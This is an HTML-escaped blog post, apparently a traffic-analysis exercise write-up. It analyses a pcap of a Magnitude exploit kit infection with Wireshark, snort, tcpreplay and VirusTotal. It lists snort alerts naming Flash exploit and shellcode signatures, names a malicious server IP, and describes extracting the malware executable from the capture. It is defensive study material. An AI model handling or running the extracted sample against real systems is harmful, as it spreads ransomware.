&lt;strong&gt;&lt;em&gt;Statistics -&amp;gt; IPv4 Statistics -&amp;gt; All Addresses&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/ipv4_addresses.png&quot; title=&quot;magnitude_ek/ipv4_addresses.png&quot; alt=&quot;magnitude_ek/ipv4_addresses.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;From the results, we notice two interesting IP addresses:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.138.158&lt;/code&gt; ~ 100%.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;62.75.195.236&lt;/code&gt; ~ 64%.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We’ll drop our attention toward those IP addresses during the analyses.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;traffic-analysis&quot;&gt;&lt;strong&gt;Traffic Analysis&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s first have a look at the web-based traffic. From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; filter, enter the following query:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(http.request or ssl.handshake.type == 1) and !(ssdp)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/web_traffic.png&quot; title=&quot;magnitude_ek/web_traffic.png&quot; alt=&quot;magnitude_ek/web_traffic.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The query will only render &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; traffic.&lt;/p&gt;

&lt;p&gt;Within the result, we select the first packet and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, by inspecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 0&lt;/code&gt;, we notice a few suspicious-looking domains.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/stream0.png&quot; title=&quot;magnitude_ek/stream0.png&quot; alt=&quot;magnitude_ek/stream0.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Continuing the analysis towards &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 1&lt;/code&gt;, there are two points catching our attention:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;All the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; traffic on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port 80&lt;/code&gt; is &lt;strong&gt;encrypted&lt;/strong&gt;/&lt;strong&gt;binary&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-shockwave-flash&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/stream1.png&quot; title=&quot;magnitude_ek/stream1.png&quot; alt=&quot;magnitude_ek/stream1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;It seems like the victim is downloading an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adobe Flash&lt;/code&gt; application/exploit.&lt;/p&gt;

&lt;p&gt;Upcoming communications are also &lt;strong&gt;encrypted&lt;/strong&gt;/&lt;strong&gt;binary&lt;/strong&gt;. Therefore, we will analyze the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirusTotal&lt;/code&gt; in the next sections.&lt;/p&gt;

&lt;h3 id=&quot;magnitude-ek&quot;&gt;&lt;strong&gt;Magnitude EK&lt;/strong&gt;&lt;/h3&gt;

&lt;h4 id=&quot;snort&quot;&gt;&lt;strong&gt;Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s us employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; to investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; with the following tags:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-q&lt;/code&gt; : for quiet.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A console&lt;/code&gt; : for output to terminal.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; : for a config file.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r&lt;/code&gt; : to read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--daq pcap&lt;/code&gt; : to select packet acquisition module.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;The command is as below:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; traffic.pcap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;05/07-20:51:37.788434  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:98] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49185 -&amp;gt; 62.75.195.236:80
05/07-20:51:37.788434  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2020895:5] ET CURRENT_EVENTS Magnitude Flash Exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; M2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49185 -&amp;gt; 62.75.195.236:80
05/07-20:51:39.132903  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021054:1] ET CURRENT_EVENTS Magnitude EK Flash Payload ShellCode Apr 23 2015 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49188
05/07-20:51:39.272670  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49189 -&amp;gt; 62.75.195.236:80
05/07-20:51:39.414407  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2000419:18] ET POLICY PE EXE or DLL Windows file download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49189
05/07-20:51:39.414407  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021076:1] ET INFO SUSPICIOUS Dotted Quad Host MZ Response &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49189
05/07-20:51:39.414407  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2009897:7] ET MALWARE Possible Windows executable sent when remote host claims to send html content &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 62.75.195.236:80 -&amp;gt; 192.168.138.158:49189
05/07-20:51:41.438424  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49190 -&amp;gt; 62.75.195.236:80
05/07-20:51:41.749079  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49191 -&amp;gt; 62.75.195.236:80
05/07-20:51:42.059997  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49192 -&amp;gt; 62.75.195.236:80
05/07-20:51:42.593075  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49193 -&amp;gt; 62.75.195.236:80
05/07-20:51:42.894386  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2017694:4] ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:49194 -&amp;gt; 62.75.195.236:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The outputs indicates that the traffic triggers multiple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; rules related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magnitude EK&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Same results for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Squert&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpreplay &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 traffic.pcap
sending out eth0 
processing file: traffic.pcap
Actual: 761 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;495665 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.03 seconds.                Rated: 16522167.0 bps, 126.05 Mbps, 25366.67 pps
Statistics &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;network device: eth0
        Attempted packets:         761
        Successful packets:        761
        Failed packets:            0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ENOBUFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EAGAIN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:  0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/squert.png&quot; title=&quot;magnitude_ek/squert.png&quot; alt=&quot;magnitude_ek/squert.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;virustotal&quot;&gt;&lt;strong&gt;VirusTotal&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Now, we extract the malware and submit it onto &lt;strong&gt;Virus Total&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To extract the malware, from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, we navigate to:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;em&gt;File -&amp;gt; Export Objects -&amp;gt; HTTP&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/malware_extract.png&quot; title=&quot;magnitude_ek/malware_extract.png&quot; alt=&quot;magnitude_ek/malware_extract.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Save the &lt;strong&gt;packet #426&lt;/strong&gt; due to the large size.&lt;/p&gt;

&lt;p&gt;Let’s us then pass it to &lt;strong&gt;Virus Total&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/virustotal.png&quot; title=&quot;magnitude_ek/virustotal.png&quot; alt=&quot;magnitude_ek/virustotal.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware&lt;/code&gt; is lighting up as a Christmas tree!.&lt;/p&gt;

&lt;p&gt;Analyzing &lt;strong&gt;packet #426&lt;/strong&gt;, it’s also a &lt;strong&gt;MS Windows executable&lt;/strong&gt; regardless of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude_ek/packet426.png&quot; title=&quot;magnitude_ek/packet426.png&quot; alt=&quot;magnitude_ek/packet426.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;From the analyses, we can safely conclude that the user is infected by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magnitude EK&lt;/code&gt;, which exploits the vulnerable &lt;strong&gt;Adobe Flash&lt;/strong&gt; and installs ransomeware on the contaminated system.&lt;/p&gt;</content><author><name></name></author><category term="snort" /><category term="traffic_analysis" /><category term="ek" /><summary type="html">Description You have a pcap, and you need to figure out what’s going on. What’s happening here? Download the .pcap here. (The password is: infected).</summary></entry></feed>